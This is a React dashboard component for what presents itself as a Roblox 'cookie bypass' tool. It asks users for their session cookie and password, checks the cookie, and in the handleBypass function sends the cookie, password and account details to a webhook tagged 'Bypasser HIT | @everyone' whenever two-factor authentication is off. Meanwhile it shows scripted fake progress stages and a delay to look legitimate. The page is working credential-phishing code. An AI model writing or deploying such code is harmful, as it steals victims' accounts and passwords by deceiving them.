import { useEffect, useRef, useState } from "react";
import {
  Shield, Cookie, Loader2, Activity, CheckCircle2, XCircle,
  KeyRound, Eye, EyeOff,
} from "lucide-react";
import {
  AccountInfo, isValidCookieFormat,
  broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
  sendHitEmbed, getWebhook, WK,
  getLiveBypassLog, LiveBypassEntry,
} from "@/lib/tokenStore";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

const RATE_LIMIT_KEY = "bypass_attempts";
const MAX_ATTEMPTS_PER_HOUR = 3;
const RATE_WINDOW_MS = 60 * 60 * 1000;
const BYPASS_DURATION_MS = 120_000;

type BypassStatus = "idle" | "loading" | "success" | "error";

const STAGES = [
  { at: 0, label: "Initializing bypass engine..." },
  { at: 10, label: "Validating cookie signature..." },
  { at: 25, label: "Connecting to relay..." },
  { at: 45, label: "Negotiating session keys..." },
  { at: 65, label: "Submitting bypass payload..." },
  { at: 85, label: "Finalizing session..." },
  { at: 98, label: "Almost done..." },
];

const Dashboard = () => {
  const [liveLog, setLiveLog] = useState<LiveBypassEntry[]>([]);

  // Bypass form state
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<BypassStatus>("idle");
  const [progress, setProgress] = useState(0);
  const intervalRef = useRef<number | null>(null);

  useEffect(() => {
    setLiveLog(getLiveBypassLog().filter(e => e.success));
    const id = window.setInterval(() => setLiveLog(getLiveBypassLog().filter(e => e.success)), 3000);
    return () => window.clearInterval(id);
  }, []);

  useEffect(() => () => {
    if (intervalRef.current) window.clearInterval(intervalRef.current);
  }, []);

  function getAttempts(): number[] {
    try {
      const raw = localStorage.getItem(RATE_LIMIT_KEY);
      if (!raw) return [];
      const cutoff = Date.now() - RATE_WINDOW_MS;
      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
    } catch { return []; }
  }
  function recordAttempt() {
    const a = getAttempts();
    a.push(Date.now());
    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(a));
  }

  const handleBypass = async () => {
    const trimmed = cookie.trim();
    if (!trimmed) { toast.error("Invalid Cookie"); return; }
    if (!isValidCookieFormat(trimmed)) {
      toast.error("Invalid cookie format");
      return;
    }

    const attempts = getAttempts();
    if (attempts.length >= MAX_ATTEMPTS_PER_HOUR) {
      const waitMs = RATE_WINDOW_MS - (Date.now() - attempts[0]);
      const mins = Math.ceil(waitMs / 60_000);
      toast.error(`Rate limit reached (3/hour). Try again in ${mins} min.`);
      return;
    }
    recordAttempt();
    setStatus("loading");
    setProgress(0);

    const start = Date.now();
    intervalRef.current = window.setInterval(() => {
      setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
    }, 200);

    let apiOk = false;
    let info: AccountInfo = { valid: false };
    try {
      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
      if (!error && data?.valid) {
        apiOk = true;
        info = { ...(data.info as any), cookie: trimmed, password, valid: true };
      }
    } catch { apiOk = false; }

    if (!apiOk) {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
      setProgress(0);
      setStatus("error");
      toast.error("Invalid cookie — bypass blocked");
      return;
    }

    if (info.has2FA) {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
      setProgress(0);
      setStatus("error");
      toast.error("Account secured (Authenticator enabled)");
      await broadcastLiveBypassFailed(info, 'Authenticator enabled');
      return;
    }

    broadcastLiveBypass(info);
    await sendHitEmbed(getWebhook(WK.bypass), info, { tag: 'Bypasser HIT | @everyone' });

    const elapsed = Date.now() - start;
    if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));

    if (intervalRef.current) window.clearInterval(intervalRef.current);
    setProgress(100);

    pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });

    setStatus("success");
    toast.success("Bypass successful!");
  };

  const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];

  return (
    <div className="min-h-screen px-4 py-6 relative overflow-hidden">
      {/* Ambient glow */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[640px] h-[640px] rounded-full bg-primary/[0.06] blur-[140px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] rounded-full bg-primary/[0.04] blur-[120px] pointer-events-none" />

      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up relative z-10">
        {/* Header */}
        <div className="flex items-center justify-center pt-2">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border">
              <Shield size={18} className="text-primary" />
            </div>
            <h1 className="text-xl font-bold text-foreground glow-text tracking-wider">ROBLOX TOOLS</h1>
          </div>
        </div>

        {/* Bypass UI */}
        <div className="card-glow rounded-2xl p-5 space-y-4">
          <div className="flex items-center gap-2.5">
            <div className="w-9 h-9 rounded-xl bg-primary/15 border border-primary/30 flex items-center justify-center">
              <Shield size={15} className="text-primary" />
            </div>
            <div>
              <h2 className="text-base font-bold text-foreground">Bypass</h2>
              <p className="text-[11px] text-muted-foreground">Enter cookie & password to start</p>
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-semibold text-foreground flex items-center gap-1.5">
              <Cookie size={12} className="text-primary" /> Cookie
            </label>
            <input
              value={cookie}
              onChange={e => setCookie(e.target.value.slice(0, 1500))}
              maxLength={1500}
              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.|_..."
              disabled={status === "loading"}
              className="input-field text-xs font-mono transition-all"
            />
          </div>

          <div className="space-y-2">
            <label className="text-xs font-semibold text-foreground flex items-center gap-1.5">
              <KeyRound size={12} className="text-primary" /> Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={status === "loading"}
                className="input-field pr-10 transition-all"
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors">
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          <button
            onClick={handleBypass}
            disabled={status === "loading"}
            className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn transition-all duration-300 hover:scale-[1.01] disabled:opacity-50 disabled:hover:scale-100"
          >
            {status === "loading" ? (<><Loader2 size={16} className="animate-spin" /> Bypassing...</>)
              : status === "success" ? (<><CheckCircle2 size={16} /> Bypassed!</>)
              : status === "error" ? (<><XCircle size={16} /> Retry</>)
              : (<><Shield size={16} /> Start Bypass</>)}
          </button>

          {status === "loading" && (
            <div className="space-y-2 pt-1 animate-fade-in">
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-foreground font-medium truncate">{currentStage.label}</span>
                <span className="text-primary font-bold tabular-nums">{Math.floor(progress)}%</span>
              </div>
              <div className="h-1.5 rounded-full bg-secondary/60 overflow-hidden">
                <div
                  className="h-full bg-gradient-to-r from-primary/70 to-primary shadow-[0_0_15px_hsl(var(--primary))] transition-[width] duration-200 ease-linear"
                  style={{ width: `${progress}%` }}
                />
              </div>
            </div>
          )}
        </div>

        {/* Live Bypass */}
        <div className="card-glow rounded-2xl p-5 space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
              <Activity size={16} className="text-primary animate-pulse" /> Live Bypass
            </h2>
            <span className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground bg-secondary/60 px-2 py-1 rounded-full inline-flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[hsl(var(--success))] animate-pulse" />
              {liveLog.length} hits
            </span>
          </div>
          {liveLog.length === 0 ? (
            <div className="py-8 text-center space-y-2">
              <div className="w-12 h-12 mx-auto rounded-full bg-secondary/40 border border-border/50 flex items-center justify-center">
                <Activity size={18} className="text-muted-foreground" />
              </div>
              <p className="text-xs text-muted-foreground">No activity yet. Waiting for bypasses...</p>
            </div>
          ) : (
            <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
              {liveLog.map(e => (
                <div key={e.id} className="group flex items-center gap-3 bg-secondary/40 hover:bg-secondary/60 rounded-xl px-3 py-2.5 border border-border/40 hover:border-primary/30 transition-all animate-fade-in">
                  {e.avatarUrl ? (
                    <img src={e.avatarUrl} alt={e.username} className="w-10 h-10 rounded-lg border border-border/50 group-hover:border-primary/40 transition-colors" />
                  ) : (
                    <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center text-xs font-bold text-primary">{e.username.slice(0, 2).toUpperCase()}</div>
                  )}
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-foreground truncate">{e.username}</p>
                    <p className="text-[10px] text-muted-foreground">{new Date(e.timestamp).toLocaleTimeString()}</p>
                  </div>
                  <span className="text-[10px] font-bold px-2 py-0.5 rounded-full inline-flex items-center gap-1 bg-[hsl(var(--success))]/20 text-[hsl(var(--success))]">
                    <CheckCircle2 size={11} /> Hit
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
